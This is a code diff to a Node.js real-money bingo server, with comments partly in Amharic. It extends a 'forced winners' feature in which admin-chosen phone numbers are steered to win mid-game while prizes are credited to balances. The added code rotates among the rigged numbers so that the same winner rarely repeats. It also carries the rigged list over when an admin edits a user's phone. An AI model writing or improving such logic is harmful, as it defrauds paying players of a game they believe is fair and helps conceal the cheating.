@@ -1005,6 +1005,22 @@ app.post('/api/admin/edit-user', auth, async (req, res) => {
         );
         
         if(updatedUser) {
+            // 🔥 UPDATE ACTIVE PLAYERS ON THE FLY (Dynamic Name/Phone change during game) 🔥
+            if (activePlayers[oldPhone]) {
+                if (oldPhone !== newPhone) {
+                    activePlayers[newPhone] = activePlayers[oldPhone];
+                    delete activePlayers[oldPhone];
+                    activePlayers[newPhone].phone = newPhone;
+                }
+                activePlayers[newPhone].name = name;
+            }
+
+            // 🔥 UPDATE FORCED WINNERS LIST IF PHONE CHANGED 🔥
+            if (oldPhone !== newPhone && GLOBAL_SETTINGS.forcedWinnerPhones.includes(oldPhone)) {
+                GLOBAL_SETTINGS.forcedWinnerPhones = GLOBAL_SETTINGS.forcedWinnerPhones.replace(oldPhone, newPhone);
+                await SystemSettings.updateOne({}, {forcedWinnerPhones: GLOBAL_SETTINGS.forcedWinnerPhones});
+            }
+
             res.json({ success: true });
         } else {
             res.json({ success: false, message: "User not found" });
@@ -1130,6 +1146,7 @@ let globalTakenTickets = [];
 
 // 🔥 Mid-game locking mechanism for Forced Winners 🔥
 let midGameChosenRigged = null;
+let recentRiggedWinners = []; // 🌟 አሸናፊዎች እንዳይደጋገሙ የሚያስታውስ ማህደረ-ትውስታ 🌟
 
 function serverCheckBingo(grid, called) {
     let m = Array(5).fill().map(() => Array(5).fill(false));
@@ -1164,26 +1181,37 @@ async function declareWinners(winners) {
     let ticketIds = [];
     let winnerDetails = []; 
     
+    let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
+
     for (let w of winners) {
-        // 🔥 ስሙ ቢቀየርም አዲሱን ስም ከዳታቤዝ አውጥቶ ለመጠቀም (Dynamic Name Fetch)
+        // 🔥 ስሙ ወይም ስልኩ ቢቀየርም አዲሱን ስም/ስልክ ተጠቅሞ ለተጠቃሚው እንዲከፍል እና አሸናፊው ላይ እንዲያወጣ
         const user = await User.findOne({phone: w.player.phone});
         let latestName = w.player.name; 
-        
+        let latestPhone = w.player.phone;
+
         if(user) { 
             latestName = user.name; 
+            latestPhone = user.phone;
             user.mainBalance += splitPrize; 
             user.won += splitPrize; 
             await user.save(); 
-            io.emit('balance_updated', w.player.phone); 
+            io.emit('balance_updated', latestPhone); 
+        }
+
+        // 🔥 አሸናፊዎች እንዳይደጋገሙ (ወደ ሚቀጥለው ማዞር)
+        if (riggedPhones.includes(latestPhone)) {
+            recentRiggedWinners.push(latestPhone);
+            // ዳታው እንዳይበዛ 20 የቅርብ ጊዜ አሸናፊዎችን ብቻ መያዝ
+            if (recentRiggedWinners.length > 20) recentRiggedWinners.shift();
         }
         
         winnerNames.push(latestName);
-        winnerPhones.push(w.player.phone);
+        winnerPhones.push(latestPhone);
         ticketIds.push(w.ticket.id);
 
         winnerDetails.push({
             name: latestName,
-            phone: w.player.phone,
+            phone: latestPhone,
             ticket: w.ticket.id,
             prize: splitPrize
         });
@@ -1249,14 +1277,24 @@ setInterval(() => {
             gameClock = 3; 
             if (currentDrawSequence.length === 0) { resetToWaiting(); return; } 
             
-            // 🌟 MID-GAME DYNAMIC RIGGING LOGIC 🌟
+            // 🌟 MID-GAME DYNAMIC RIGGING LOGIC (አሸናፊዎች እንዳይደጋገሙ ማዞሪያ) 🌟
             let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
             if (riggedPhones.length > 0) {
                 let activeRigged = riggedPhones.filter(p => activePlayers[p]);
                 if (activeRigged.length > 0) {
                     
                     if (!midGameChosenRigged || !activeRigged.includes(midGameChosenRigged)) {
-                        midGameChosenRigged = activeRigged[Math.floor(Math.random() * activeRigged.length)];
+                        // በቅርብ ጊዜ ያላሸነፉትን ስልኮች ብቻ መምረጥ
+                        let availableRigged = activeRigged.filter(p => !recentRiggedWinners.includes(p));
+                        
+                        if (availableRigged.length === 0) {
+                            // ሁሉም ስልኮች አሸንፈው ካለቁ፣ እገዳውን ማንሳትና እንደ አዲስ ማዞር
+                            recentRiggedWinners = recentRiggedWinners.filter(p => !activeRigged.includes(p));
+                            availableRigged = activeRigged;
+                        }
+                        
+                        // ያላሸነፉት ውስጥ በዕጣ አንዱን መምረጥ
+                        midGameChosenRigged = availableRigged[Math.floor(Math.random() * availableRigged.length)];
                     }
                     
                     let targetTicket = activePlayers[midGameChosenRigged].ticketsData[0]; 
@@ -2380,8 +2418,6 @@ setInterval(async () => {
         console.log("System Check Error:", error);
     }
 }, 15 * 60 * 1000); 
-
-// (የታሪክ ማጥፊያው 코ድ ሙሉ በሙሉ ተሰርዟል! አሁን GameHistory ዳታቤዝ ላይ አይጠፋም።)
 
 server.listen(process.env.PORT || 3000, () => console.log(`🚀 Server running on port 3000`));
 
